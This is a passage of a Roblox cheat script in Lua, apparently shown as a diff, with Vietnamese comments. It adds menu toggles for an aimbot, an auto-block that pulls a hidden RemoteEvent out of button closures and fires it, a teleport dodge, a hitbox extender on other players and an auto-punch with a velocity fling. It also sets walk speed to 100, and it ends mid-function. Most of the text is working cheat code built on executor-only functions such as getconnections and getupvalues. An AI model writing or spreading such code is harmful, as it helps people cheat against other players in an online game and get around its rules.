-
-        -- 🧠 Kiểm tra highlight có target mình không
-        local function adorneeIsPlayerCharacter(h)
-            if not h then return false end
-            local adornee = h.Adornee
-            local char = player.Character
-            if not adornee or not char then return false end
-            return adornee == char or adornee:IsDescendantOf(char)
-        end
-
-        -- 🧰 Hàm kích nút Sprinting (chỉ gọi 1 lần)
-        local function triggerSprint()
-            if device ~= "Mobile" then return end
-            local btn = getSprintingButton()
-            if not btn then return end
-            local conns = getconnections(btn.MouseButton1Down)
-            for _, v in pairs(conns) do
-                pcall(function()
-                    v:Fire()
-                    if v.Function then v:Function() end
-                end)
-            end
-        end
-
-        -- 🧹 Cleanup function
-        local function cleanup()
-            if _G.AutoTrick_Connections then
-                for _, conn in ipairs(_G.AutoTrick_Connections) do
-                    if conn and conn.Connected then
-                        conn:Disconnect()
-                    end
-                end
-                _G.AutoTrick_Connections = nil
-            end
-            if _G.AutoTrick_Loop then
-                task.cancel(_G.AutoTrick_Loop)
-                _G.AutoTrick_Loop = nil
-            end
-        end
-
-        if Value then
-
-            local behaviorFolder = getBehaviorFolder()
-            if not behaviorFolder then
-                return
-            end
-
-            local highlights = {}
-            _G.AutoTrick_Connections = {}
-
-            -- 🔍 Khi có highlight mới thêm vào
-            local addConn = behaviorFolder.DescendantAdded:Connect(function(child)
-                if child:IsA("Highlight") then
-                    highlights[child] = true
-                end
-            end)
-
-            -- 🔍 Khi highlight bị xóa
-            local removeConn = behaviorFolder.DescendantRemoving:Connect(function(child)
-                if child:IsA("Highlight") then
-                    highlights[child] = nil
-                end
-            end)
-
-            table.insert(_G.AutoTrick_Connections, addConn)
-            table.insert(_G.AutoTrick_Connections, removeConn)
-
-            -- 🚀 Vòng kiểm tra định kỳ nhẹ (0.3s/lần)
-            _G.AutoTrick_Loop = task.spawn(function()
-                while task.wait(0.3) do
-                    if not Value then break end
-                    for h in pairs(highlights) do
-                        if adorneeIsPlayerCharacter(h) then
-                            triggerSprint()
-                            break
-                        end
-                    end
-                end
-            end)
-
-        else
-            cleanup()
-        end
-    end
-})
-
-
-    Tabs.Main:AddSection("Dusekkar")
-
-
---// Dusk Aim Assist (Fluent Dropdown trên Toggle) - Locked Target Version
-do
--- 🧠 Services
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local Workspace = game:GetService("Workspace")
-
--- 📍 References
-local LocalPlayer = Players.LocalPlayer
-local Camera = Workspace.CurrentCamera
-
--- ⚙️ Config
-local TargetAnimationID = "rbxassetid://77894750279891"
-local Enabled = false
-local Smoothness = 0.2
-
--- Thời gian tối đa khóa target (giây) sau khi chọn target
-local LOCK_DURATION = 0.7
-
--- 🎛️ Fluent UI Controls
-local toggleFlag = Instance.new("BoolValue")
-toggleFlag.Name = "DuskAim_ToggleFlag"
-toggleFlag.Value = false
-
--- Dropdown ở TRÊN
-Tabs.Main:AddDropdown("DuskSmooth", {
-    Title = "Smoothness",
-    Values = {"Low", "Medium", "High"},
-    Default = "Medium",
-}):OnChanged(function(value)
-    if value == "Low" then
-        Smoothness = 0.1
-    elseif value == "Medium" then
-        Smoothness = 0.2
-    elseif value == "High" then
-        Smoothness = 0.4
-    end
-end)
-
--- Toggle ở DƯỚI
-Tabs.Main:AddToggle("DuskAim", {
-    Title = "Dusk Aim Assist",
-    Default = false,
-}):OnChanged(function(state)
-    Enabled = state
-    toggleFlag.Value = state
-    -- reset any locked target when toggling off
-    if not state then
-        currentTarget = nil
-        lockExpires = nil
-    end
-end)
-
--- 🎯 Find nearest player (returns HumanoidRootPart or nil)
-local function getNearestPlayerRoot()
-    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        return nil
-    end
-
-    local nearest, distance = nil, math.huge
-    local myPos = LocalPlayer.Character.HumanoidRootPart.Position
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-            local root = player.Character.HumanoidRootPart
-            local dist = (root.Position - myPos).Magnitude
-            if dist < distance then
-                distance = dist
-                nearest = root
-            end
-        end
-    end
-    return nearest
-end
-
--- Helper: check if a humanoid is currently playing the target animation
-local function humanoidIsPlayingTargetAnimation(humanoid)
-    if not humanoid then return false end
-    for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
-        if track.Animation and track.Animation.AnimationId == TargetAnimationID then
-            return true
-        end
-    end
-    return false
-end
-
--- State for locked target
-local currentTarget = nil          -- HumanoidRootPart (locked)
-local currentTargetHumanoid = nil  -- Humanoid of the locked target's character
-local lockExpires = nil            -- timestamp when lock can be released at earliest
-
--- 🔥 Aimbot logic (RenderStepped)
-RunService.RenderStepped:Connect(function()
-    if not Enabled then
-        return
-    end
-
-    -- safety: require local character and camera
-    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or not Camera then
-        currentTarget = nil
-        currentTargetHumanoid = nil
-        lockExpires = nil
-        return
-    end
-
-    -- First: detect if ANY player is playing the target animation
-    local anyAnimPlaying = false
-    for _, player in pairs(Players:GetPlayers()) do
-        if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
-            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
-            if humanoidIsPlayingTargetAnimation(humanoid) then
-                anyAnimPlaying = true
-                -- If we don't have a locked target yet, lock to the nearest player NOW
-                if not currentTarget then
-                    local chosen = getNearestPlayerRoot()
-                    if chosen then
-                        currentTarget = chosen
-                        currentTargetHumanoid = chosen.Parent and chosen.Parent:FindFirstChildOfClass("Humanoid") or nil
-                        lockExpires = tick() + LOCK_DURATION
-                    end
-                end
-                -- We break here optionally (we only need to know that an animation is playing).
-                -- But do not break if we want to check other players' animations as well; either is fine.
-                -- We'll not break so we keep checking; but one detection is enough to keep anyAnimPlaying = true.
-            end
-        end
-    end
-
-    -- If there is a locked target, aim at it while animation(s) are playing OR until lockExpires
-    if currentTarget and currentTarget.Parent and currentTargetHumanoid then
-        -- validate target: still has HumanoidRootPart and is alive
-        if not currentTarget or not currentTarget.Parent or not currentTarget.Parent:FindFirstChild("HumanoidRootPart") then
-            -- invalid target, release
-            currentTarget = nil
-            currentTargetHumanoid = nil
-            lockExpires = nil
-            return
-        end
-
-        -- Determine whether we should continue aiming:
-        -- continue if either (a) any player is currently playing the target animation OR
-        -- (b) we haven't reached lockExpires yet (ensures a short guaranteed aiming window)
-        local continueAiming = anyAnimPlaying or (lockExpires and tick() < lockExpires)
-
-        if continueAiming then
-            local aimPos = currentTarget.Position
-            local camCFrame = Camera.CFrame
-            -- avoid zero-length direction
-            local dirVec = aimPos - camCFrame.Position
-            if dirVec.Magnitude > 0 then
-                local direction = dirVec.Unit
-                Camera.CFrame = Camera.CFrame:Lerp(
-                    CFrame.new(camCFrame.Position, camCFrame.Position + direction),
-                    Smoothness
-                )
-            end
-            return
-        else
-            -- no animation playing and lock expired -> release target, allow new selection next detection
-            currentTarget = nil
-            currentTargetHumanoid = nil
-            lockExpires = nil
-            return
-        end
-    end
-
-    -- If we get here: no locked target, but if an animation is playing we already set one above.
-    -- Nothing to do otherwise.
-end)
-end
-
-
-
-    Tabs.Main:AddSection("Guest1337")
-
-
-
-
-do
-    local Players = game:GetService("Players")
-    local RunService = game:GetService("RunService")
-    local localPlayer = Players.LocalPlayer
-
-    local Killers = {
-        ["Slasher"] = true,
-        ["1x1x1x1"] = true,
-        ["c00lkidd"] = true,
-        ["Noli"] = true,
-        ["JohnDoe"] = true,
-        ["Guest 666"] = true,
-        ["Sixer"] = true
-    }
-
-    local function isKiller(player)
-        local char = player.Character
-        if not char then return false end
-        return Killers[char.Name] == true
-    end
-
-    local animationIds = {
-        ["83829782357897"]  = true, -- Slash, 1x1x1x1
-        ["126830014841198"] = true, -- Slash, Jason
-        ["126355327951215"] = true, -- Behead, Jason
-        ["121086746534252"] = true, -- GashingWoundStart, Jason
-        ["105458270463374"] = true, -- Slash, JohnDoe
-        ["18885909645"]     = true, -- Attack, c00lkid
-        ["94162446513587"]  = true, -- Slash, JohnDoe, Skin: !Joner
-        ["93069721274110"]  = true, -- Slash, JohnDoe, Skin: AnnihilationJohnDoe
-        ["97433060861952"]  = true, -- Slash, JohnDoe, Skin: #SK
-        ["121293883585738"] = true, -- Slash, 1x1x1x1
-        ["92173139187970"]  = true, -- Slash, Skin: Hacklord1x1x1x1
-        ["106847695270773"] = true, -- GashingWoundStart, Jason, Skin: Subject0Jason
-        ["125403313786645"] = true, -- Slash, Jason, Skin: Subject0Jason
-        ["81639435858902"]  = true, -- Behead, Jason, Skin: WhitePumpkinJason
-        ["137314737492715"] = true, -- GashingWoundStart, Jason, Skin: WhitePumpkinJason
-        ["120112897026015"] = true, -- Slash, Jason, Skin: WhitePumpkinJason
-        ["82113744478546"]  = true, -- Behead, Jason (nhiều skin)
-        ["118298475669935"] = true, -- Slash, Jason (nhiều skin)
-        ["126681776859538"] = true, -- Behead, Jason, Skin: PursuerJason
-        ["129976080405072"] = true, -- GashingWoundStart, Jason, Skin: PursuerJason
-        ["109667959938617"] = true, -- Slash, Jason, Skin: PursuerJason
-        ["74707328554358"]  = true, -- Slash, Jason, Skin: #DeadRabbitsJason
-        ["133336594357903"] = true, -- Behead, Jason, Skin: #DeadRabbitsJason
-        ["86204001129974"]  = true, -- GashingWoundStart, Jason, Skin: #DeadRabbitsJason
-        ["70371667919898"]  = true, -- Attack, c00lkidd, Skin: MafiosoC00l
-        ["131543461321709"] = true, -- Attack, c00lkidd, Skin: SaviorC00l
-        ["106776364623742"] = true, -- Walkspeed Overing, c00lkidd (all skins)
-        ["136323728355613"] = true, -- Swing, Noli
-        ["109230267448394"] = true, -- Swing, Noli (all skins)
-        ["139835501033932"] = true, -- VoidRush, Noli (all skins)
-        ["114356208094580"] = true, -- VoidRush2, Noli
-        ["106538427162796"] = true, -- Stab, All Noli
-        ["126896426760253"] = true, -- VoidRush, Noli
-        ["131430497821198"] = true, -- MassInfection, 1x1x1x1
-        ["100592913030351"] = true, -- MassInfection, 1x1x1x1 (Fleskhjerta/AceOfSpades/Lancer)
-        ["70447634862911"]  = true, -- MassInfection, Skin: Hacklord1x1x1x1 Old
-        ["83685305553364"]  = true, -- MassInfection, Skin: Hacklord1x1x1x1 New
-        ["126171487400618"]  = true, -- Slash, Skin: Hacklord1x1x1x1
-        ["97167027849946"]  = true, -- Noli Dash Belike
-        ["99135633258223"]  = true,
-        ["98456918873918"]  = true,
-        ["83251433279852"]  = true,
-        ["126681776859538"] = true,
-        ["129976080405072"] = true,
-        ["122709416391891"] = true, -- Đánh Thường Guest 666
-        ["87989533095285"] = true, -- Vồ Tới Guest 666
-        ["139309647473555"] = true, -- Bay Đến Mục Tiêu
-        ["133363345661032"] = true, -- Chuẩn Bị Bay Đến Mục tiêu
-        ["128414736976503"] = true, -- Sẵn Sàng Bay Đến
---        ["121808371053483"] = true, -- La Hét Vào Mặt :))
-        ["77375846492436"] = true, -- Noli Aful Rework
-        ["92445608014276"] = true, -- NAR
-        ["100358581940485"] = true, -- NAR
-        ["91758760621955"] = true, -- NAR
-        ["94634594529334"] = true, -- NAR
-        ["90620531468240"] = true, -- 1x slash m2-3 rework
-        ["94958041603347"] = true, -- Slasher Bí ngô trắng / chém
-        ["131642454238375"] = true, -- Slasher Bí Ngô trắng / Khóa skill
-        ["110702884830060"] = true, -- Slasher Bí Ngô Trắng / Liên Hoàn Chém
-        ["76312020299624"] = true, -- Noli Admin Void rush
-        ["126654961540956"] = true, -- NAVR
-        ["139613699193400"] = true, -- NAVR
-        ["91509234639766"] = true, -- NA Đánh Thường
-        ["105458270463374"] = true, -- John Doe M3 và M4 Đánh Thường
-    }
-
-    local delayedAnimations = {}
-
-    local toggleOn = false
-    local strictRangeOn = false
-    local detectionRange = 18
-
-    local blockRemote
-    local blockButton, connections = nil, {}
-
-    local function findBlockRemote()
-        if blockRemote then return blockRemote end
-        if not blockButton then return nil end
-        for _, conn in ipairs(getconnections(blockButton.MouseButton1Click)) do
-            local f = conn.Function
-            if f and islclosure(f) then
-                local upvals = getupvalues(f)
-                for _, v in pairs(upvals) do
-                    if typeof(v) == "Instance" and v:IsA("RemoteEvent") then
-                        blockRemote = v
-                    end
-                end
-            end
-        end
-        return nil
-    end
-
-    local function initBlockButton()
-        local gui = localPlayer:FindFirstChild("PlayerGui")
-        if not gui then return end
-        local mainUI = gui:FindFirstChild("MainUI")
-        local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
-        blockButton = container and container:FindFirstChild("Block")
-        if blockButton and blockButton:IsA("ImageButton") then
-            connections = getconnections(blockButton.MouseButton1Click)
-            findBlockRemote()
-        end
-    end
-
-    initBlockButton()
-    localPlayer.CharacterAdded:Connect(function()
-        task.wait(0)
-        initBlockButton()
-    end)
-
-    local function fastBlock()
-        if blockRemote then
-            pcall(function()
-                blockRemote:FireServer(true)
-                task.delay(1e-10, function()
-                    blockRemote:FireServer(false)
-                end)
-            end)
-        else
-            if not blockButton or not blockButton.Visible then return end
-            for _, conn in ipairs(connections) do
-                pcall(function() conn:Fire() end)
-            end
-            pcall(function() blockButton:Activate() end)
-        end
-    end
-
-    local lastTeleport = 0
-    local function teleportDodge(killerChar)
-        local now = tick()
-        if now - lastTeleport < 5 then return end
-        lastTeleport = now
-
-        local myChar = localPlayer.Character
-        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
-        local killerRoot = killerChar and killerChar:FindFirstChild("HumanoidRootPart")
-        if not (myRoot and killerRoot) then return end
-
-        local oldCFrame = myRoot.CFrame
-        local forward = killerRoot.CFrame.LookVector
-
-        myRoot.CFrame = killerRoot.CFrame + forward * 7.5
-
-        task.delay(0.1, function()
-            if myRoot then
-                myRoot.CFrame = oldCFrame
-            end
-        end)
-    end
-
-    local function getBoolFlag(name, default)
-        local flag = localPlayer:FindFirstChild(name)
-        if not flag then
-            flag = Instance.new("BoolValue")
-            flag.Name = name
-            flag.Value = default
-            flag.Parent = localPlayer
-        end
-        return flag
-    end
-
-    local function getNumberFlag(name, default)
-        local flag = localPlayer:FindFirstChild(name)
-        if not flag then
-            flag = Instance.new("NumberValue")
-            flag.Name = name
-            flag.Value = default
-            flag.Parent = localPlayer
-        end
-        return flag
-    end
-
-    local toggleFlag = getBoolFlag("AutoBlockToggle", false)
-    local strictFlag = getBoolFlag("AutoBlockStrictRange", false)
-    local rangeFlag = getNumberFlag("AutoBlockRange", 18)
-
-    toggleOn = toggleFlag.Value
-    strictRangeOn = strictFlag.Value
-    detectionRange = rangeFlag.Value
-
-    Tabs.Main:AddToggle("AutoBlockV2", {Title = "Auto Block V3", Default = toggleOn})
-        :OnChanged(function(state)
-            toggleOn = state
-            toggleFlag.Value = state
-        end)
-
-    Tabs.Main:AddToggle("StrictRangeCheck", {Title = "Auto Check V3", Default = strictRangeOn})
-        :OnChanged(function(state)
-            strictRangeOn = state
-            strictFlag.Value = state
-        end)
-
-    Tabs.Main:AddInput("RangeCheckInput", {
-        Title = "Range Check",
-        Default = tostring(detectionRange),
-        Placeholder = "Enter detection range"
-    }):OnChanged(function(txt)
-        local val = tonumber(txt)
-        if val then
-            detectionRange = val
-            rangeFlag.Value = val
-        end
-    end)
-
-    local playerConns = {}
-    local recentBlocks = {}
-    local COOLDOWN_ZERO, COOLDOWN_MISS = 0, 0
-
-    local function cleanupPlayerConns(p)
-        local tbl = playerConns[p]
-        if tbl then
-            for _, c in ipairs(tbl) do
-                if c and c.Disconnect then c:Disconnect() end
-            end
-            playerConns[p] = nil
-        end
-        recentBlocks[p.UserId] = nil
-    end
-
-    local function shouldBlockNow(p, animId, track)
-        recentBlocks[p.UserId] = recentBlocks[p.UserId] or {}
-        local last = recentBlocks[p.UserId][animId] or 0
-        local now = tick()
-        if track.TimePosition <= 0 then
-            if now - last >= COOLDOWN_ZERO then
-                recentBlocks[p.UserId][animId] = now
-                return true
-            end
-            return false
-        else
-            if now - last >= COOLDOWN_MISS then
-                recentBlocks[p.UserId][animId] = now
-                return true
-            end
-            return false
-        end
-    end
-
-    local massInfectionIds = {
-        ["131430497821198"] = true,
-        ["100592913030351"] = true,
-        ["70447634862911"]  = true,
-        ["83685305553364"]  = true,
-        ["101101433684051"] = true,
-    }
-
-    local function onAnimationPlayed(player, char, track)
-        if not toggleOn then return end
-        if not (track and track.Animation) then return end
-        local animIdStr = track.Animation.AnimationId
-        local id = animIdStr and string.match(animIdStr, "%d+")
-        if not id or not animationIds[id] then return end
-
-        if strictRangeOn then
-            local myChar = localPlayer.Character
-            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
-            local root = char and char:FindFirstChild("HumanoidRootPart")
-            if not myRoot or not root then return end
-            local dist = (root.Position - myRoot.Position).Magnitude
-            if dist > detectionRange then return end
-        end
-
-        if shouldBlockNow(player, id, track) then
-            if massInfectionIds[id] then
-                task.delay(0.5, fastBlock) -- delay 0.5s cho MassInfection
-            else
-                fastBlock()
-            end
-
-            if isKiller(player) and delayedAnimations[id] then
-                teleportDodge(char)
-            end
-        end
-    end
-
-    local function monitorCharacter(player, char)
-        if not player or not char then return end
-        local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5)
-        if not hum then return end
-        local con = hum.AnimationPlayed:Connect(function(track)
-            task.spawn(onAnimationPlayed, player, char, track)
-        end)
-        playerConns[player] = playerConns[player] or {}
-        table.insert(playerConns[player], con)
-    end
-
-    local function onPlayerAdded(player)
-        if player == localPlayer then return end
-        if player.Character then monitorCharacter(player, player.Character) end
-        local conCharAdded = player.CharacterAdded:Connect(function(char)
-            task.wait(0)
-            monitorCharacter(player, char)
-        end)
-        playerConns[player] = playerConns[player] or {}
-        table.insert(playerConns[player], conCharAdded)
-    end
-
-    for _, p in ipairs(Players:GetPlayers()) do onPlayerAdded(p) end
-    Players.PlayerAdded:Connect(onPlayerAdded)
-    Players.PlayerRemoving:Connect(cleanupPlayerConns)
-
-    local circles = {}
-
-    local function createCircleFor(player, hrp)
-        if circles[player] then circles[player]:Destroy() end
-        local circle = Instance.new("Part")
-        circle.Anchored, circle.CanCollide = true, false
-        circle.Shape = Enum.PartType.Cylinder
-        circle.Size = Vector3.new(0.2, detectionRange * 2, detectionRange * 2)
-        circle.CFrame = hrp.CFrame * CFrame.Angles(0, 0, math.rad(90))
-        circle.Material, circle.Transparency = Enum.Material.Neon, 0.5
-        circle.Color = Color3.fromRGB(255, 0, 0)
-        circle.Parent = workspace
-        circles[player] = circle
-    end
-
-    local function removeCircle(player)
-        if circles[player] then circles[player]:Destroy() circles[player] = nil end
-    end
-
-    RunService.Heartbeat:Connect(function()
-        if not strictRangeOn then
-            for _, circle in pairs(circles) do
-                if circle then circle.Transparency = 1 end
-            end
-            return
-        end
-        local myChar = localPlayer.Character
-        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
-        if not myRoot then return end
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= localPlayer then
-                local char = player.Character
-                local hrp = char and char:FindFirstChild("HumanoidRootPart")
-                local hum = char and char:FindFirstChildOfClass("Humanoid")
-                if hrp and hum and hum.Health > 0 and isKiller(player) then
-                    if not circles[player] then createCircleFor(player, hrp) end
-                    local circle = circles[player]
-                    circle.Size = Vector3.new(0.2, detectionRange * 2, detectionRange * 2)
-                    circle.CFrame = hrp.CFrame * CFrame.Angles(0, 0, math.rad(90))
-                    local dist = (myRoot.Position - hrp.Position).Magnitude
-                    circle.Color = (dist <= detectionRange) and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
-                    circle.Transparency = 0.5
-                else
-                    removeCircle(player)
-                end
-            end
-        end
-    end)
-
-    Players.PlayerRemoving:Connect(removeCircle)
-end
-
-
-
-
-
-
-do
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local lp = Players.LocalPlayer
-
-if getgenv().emergency_stop == nil then
-    getgenv().emergency_stop = false
-end
-
--- 🔧 Chuyển studs thành độ tăng kích thước
-local function StudsIntoSize(studs)
-    return studs * 0.5
-end
-
--- ⚙️ Hàm tăng hitbox người khác
-local function ExtendOthersHitbox(studs, time)
-    local size_increase = StudsIntoSize(studs)
-    local start = tick()
-
-    if getgenv().emergency_stop then
-        getgenv().emergency_stop = false
-    end
-
-    repeat
-        task.wait(0.05)
-        for _, plr in pairs(Players:GetPlayers()) do
-            if plr ~= lp and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-                for _, part in pairs(plr.Character:GetChildren()) do
-                    if part:IsA("BasePart") then
-                        local originalSize = part.Size
-                        part.Size = Vector3.new(
-                            originalSize.X + size_increase,
-                            originalSize.Y,
-                            originalSize.Z + size_increase
-                        )
-                        part.Massless = true
-                        part.CanCollide = false
-                    end
-                end
-            end
-        end
-    until tick() - start > tonumber(time) or getgenv().emergency_stop
-
-    -- 🔄 Trả lại kích thước cũ
-    if getgenv().emergency_stop then
-        getgenv().emergency_stop = false
-    end
-
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr ~= lp and plr.Character then
-            for _, part in pairs(plr.Character:GetChildren()) do
-                if part:IsA("BasePart") then
-                    part.Size = Vector3.new(2, 2, 1)
-                end
-            end
-        end
-    end
-end
-
--- 🛑 Hàm dừng
-local function StopExtendingHitbox()
-    getgenv().emergency_stop = true
-end
-
--- 🟢 Nút bật/tắt hitbox extender
-Tabs.Main:AddToggle("ExtendHitboxOthers", {
-    Title = "Block Hitbox",
-    Default = false,
-    Callback = function(Value)
-        if Value then
-            task.spawn(function()
-                while Value and not getgenv().emergency_stop do
-                    ExtendOthersHitbox(1.5, 2)
-                    task.wait(0)
-                end
-            end)
-        else
-            StopExtendingHitbox()
-        end
-    end
-})
-end
-
-
-
-
-
-do
-    -- Auto Punch settings
-    local autoPunchOn, aimPunch, flingPunchOn, customPunchEnabled = false, false, false, false
-    local hiddenfling = false
-    local flingPower = 10000
-    local predictionValue = 4
-    local customPunchAnimId = ""
-    local Humanoid
-    local lastPunchTime = 0
-    local punchAnimIds = { "87259391926321" }
-    local LP = game:GetService("Players").LocalPlayer
-    local RunService = game:GetService("RunService")
-    local PlayerGui = LP:WaitForChild("PlayerGui")
-
-    -- Function: play custom punch anim
-    local function playCustomPunch(animId)
-        if not Humanoid then return end
-        if not animId or animId == "" then return end
-        local now = tick()
-        if now - lastPunchTime < 1 then return end
-
-        for _, track in ipairs(Humanoid:GetPlayingAnimationTracks()) do
-            local animNum = tostring(track.Animation.AnimationId):match("%d+")
-            if table.find(punchAnimIds, animNum) then
-                track:Stop()
-            end
-        end
-
-        local anim = Instance.new("Animation")
-        anim.AnimationId = "rbxassetid://" .. animId
-        local track = Humanoid:LoadAnimation(anim)
-        track:Play()
-        lastPunchTime = now
-    end
-
-    -- Hidden fling coroutine
-    coroutine.wrap(function()
-        local hrp, c, vel, movel = nil, nil, nil, 0.1
-        while true do
-            RunService.Heartbeat:Wait()
-            if hiddenfling then
-                while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
-                    RunService.Heartbeat:Wait()
-                    c = LP.Character
-                    hrp = c and c:FindFirstChild("HumanoidRootPart")
-                end
-                if hiddenfling then
-                    vel = hrp.Velocity
-                    hrp.Velocity = vel * flingPower + Vector3.new(0, flingPower, 0)
-                    RunService.RenderStepped:Wait()
-                    hrp.Velocity = vel
-                    RunService.Stepped:Wait()
-                    hrp.Velocity = vel + Vector3.new(0, movel, 0)
-                    movel = movel * -1
-                end
-            end
-        end
-    end)()
-
-    -- Auto Punch loop
-    RunService.RenderStepped:Connect(function()
-        local myChar = LP.Character
-        if not myChar then return end
-        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
-        Humanoid = myChar:FindFirstChildOfClass("Humanoid")
-
-        if autoPunchOn then
-            local gui = PlayerGui:FindFirstChild("MainUI")
-            local punchBtn = gui and gui:FindFirstChild("AbilityContainer") and gui.AbilityContainer:FindFirstChild("Punch")
-            local charges = punchBtn and punchBtn:FindFirstChild("Charges")
-
-            if charges and charges.Text == "1" then
-                local killerNames = {"c00lkidd", "Slasher", "JohnDoe", "1x1x1x1", "Noli", "Guest 666", "Sixer"}
-                for _, name in ipairs(killerNames) do
-                    local killer = workspace:FindFirstChild("Players")
-                        and workspace.Players:FindFirstChild("Killers")
-                        and workspace.Players.Killers:FindFirstChild(name)
-
-                    if killer and killer:FindFirstChild("HumanoidRootPart") then
-                        local root = killer.HumanoidRootPart
-                        if root and myRoot and (root.Position - myRoot.Position).Magnitude <= 10 then
-                            
-                            -- Aim Punch
-                            if aimPunch then
-                                local humanoid = myChar:FindFirstChild("Humanoid")
-                                if humanoid then humanoid.AutoRotate = false end
-                                task.spawn(function()
-                                    local start = tick()
-                                    while tick() - start < 2 do
-                                        if myRoot and root and root.Parent then
-                                            local predictedPos = root.Position + (root.CFrame.LookVector * predictionValue)
-                                            myRoot.CFrame = CFrame.lookAt(myRoot.Position, predictedPos)
-                                        end
-                                        task.wait()
-                                    end
-                                    if humanoid then humanoid.AutoRotate = true end
-                                end)
-                            end
-
-                            -- Click punch button
-                            for _, conn in ipairs(getconnections(punchBtn.MouseButton1Click)) do
-                                pcall(function() conn:Fire() end)
-                            end
-
-                            -- Fling Punch
-                            if flingPunchOn then
-                                hiddenfling = true
-                                task.spawn(function()
-                                    local start = tick()
-                                    while tick() - start < 1 do
-                                        if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and root and root.Parent then
-                                            local frontPos = root.Position + (root.CFrame.LookVector * 2)
-                                            LP.Character.HumanoidRootPart.CFrame = CFrame.new(frontPos, root.Position)
-                                        end
-                                        task.wait()
-                                    end
-                                    hiddenfling = false
-                                end)
-                            end
-
-                            -- Custom anim
-                            if customPunchEnabled and customPunchAnimId ~= "" then
-                                playCustomPunch(customPunchAnimId)
-                            end
-
-                            break -- chỉ đánh 1 killer mỗi vòng
-                        end
-                    end
-                end
-            end
-        end
-    end)
-
-    -- === Nút cho Tabs.Main (thêm vào GUI có sẵn) ===
-    Tabs.Main:AddToggle("AutoPunch", { Title = "Auto Punch", Default = false })
-        :OnChanged(function(val) autoPunchOn = val end)
-
-    Tabs.Main:AddToggle("AimPunch", { Title = "Punch Aimbot", Default = false })
-        :OnChanged(function(val) aimPunch = val end)
-
-    Tabs.Main:AddToggle("FlingPunch", { Title = "Fling Punch", Default = false })
-        :OnChanged(function(val) flingPunchOn = val end)
-
-    Tabs.Main:AddSlider("Prediction", {
-        Title = "Aim Prediction",
-        Min = 0, Max = 10, Default = 4, Rounding = 1,
-    }):OnChanged(function(val) predictionValue = val end)
-
-    Tabs.Main:AddSlider("FlingPower", {
-        Title = "Fling Power",
-        Min = 5000, Max = 500000, Default = 10000, Rounding = 0,
-    }):OnChanged(function(val) flingPower = val end)
-
-    Tabs.Main:AddInput("CustomAnim", {
-        Title = "Custom Punch",
-        Default = "",
-        Placeholder = "Enter Animation ID"
-    }):OnChanged(function(txt) customPunchAnimId = txt end)
-
-    Tabs.Main:AddToggle("EnableCustomAnim", { Title = "Enable Custom Animation", Default = false })
-        :OnChanged(function(val) customPunchEnabled = val end)
-end
-
-    Tabs.Main:AddSection("c00lkidd")
-
-
-
-do
-    --== ⚙️ Base Globals ==--
-    local Players = game:GetService("Players")
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local RunService = game:GetService("RunService")
-    local Workspace = game:GetService("Workspace")
-    local Camera = Workspace.CurrentCamera
-    local Player = Players.LocalPlayer
-
-    getgenv().Remote = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent")
-    getgenv().walkSpeed = 100
-    getgenv().connection = nil
-    getgenv().blockFootstepPlayed = false
-
-    --== 🧠 Helpers ==--
-    local function getCharacter()
-        return Player.Character or Player.CharacterAdded:Wait()
-    end
-
-    --== 🎯 Target list ==
-    -- Thay specialTargets bằng folder Survivors tự động
-    local survivorsFolder = workspace:WaitForChild("Players"):WaitForChild("Survivors")
-
-    local function isSpecialTarget(char)
-        if not char then return false end
-        if survivorsFolder:FindFirstChild(char.Name) then
-            return true
-        end
-        -- một số model có thể là child của model (cẩn thận)
-        for _, child in ipairs(char:GetChildren()) do
-            if survivorsFolder:FindFirstChild(child.Name) then
-                return true
-            end
-        end
-        return false
-    end
-
-    --== 🏃 Movement Logic ==--
-    local stopMovement = false
-    local validValues = { Timeout = true, Collide = true, Hit = true }
-    local stopTimerTask = nil
-    local STOP_TIMEOUT = 5
-
-    local function startStopTimeout()
-        if stopTimerTask then return end
-        stopTimerTask = task.spawn(function()
-            task.wait(STOP_TIMEOUT)
-            stopMovement = false
-            stopTimerTask = nil
-        end)
-    end
-
-    local function cancelStopTimeout()
-        stopTimerTask = nil
-    end
-
-    local function watchResult(result)
-        local function check()
-            if validValues[result.Value] then
-                stopMovement = true
-                startStopTimeout()
-            else
-                stopMovement = false
-                cancelStopTimeout()
-            end
-        end
-        pcall(check)
-        local conn
-        conn = result:GetPropertyChangedSignal("Value"):Connect(function()
-            pcall(check)
-        end)
-        result.AncestryChanged:Connect(function(_, parent)
-            if not parent then
-                stopMovement = false
-                cancelStopTimeout()
-                if conn then
-                    conn:Disconnect()
-                    conn = nil
-                end
-            end
-        end)
-    end
-
-    local function onCharacterAdded(character)
-        local result = character:FindFirstChild("Result")
-        if result and result:IsA("StringValue") then
-            watchResult(result)
-        end
-        character.ChildAdded:Connect(function(child)
-            if child.Name == "Result" and child:IsA("StringValue") then
-                watchResult(child)
-            end
-        end)
-        character.ChildRemoved:Connect(function(child)
-            if child.Name == "Result" then
-                stopMovement = false
-                cancelStopTimeout()
-            end
-        end)
-    end
-
-    Player.CharacterAdded:Connect(onCharacterAdded)
-    if Player.Character then
-        onCharacterAdded(Player.Character)
-    end
-
-    --== 🔎 Helpers ==--
-    local function getHumRoot(partOrChar)
-        if not partOrChar then return nil end
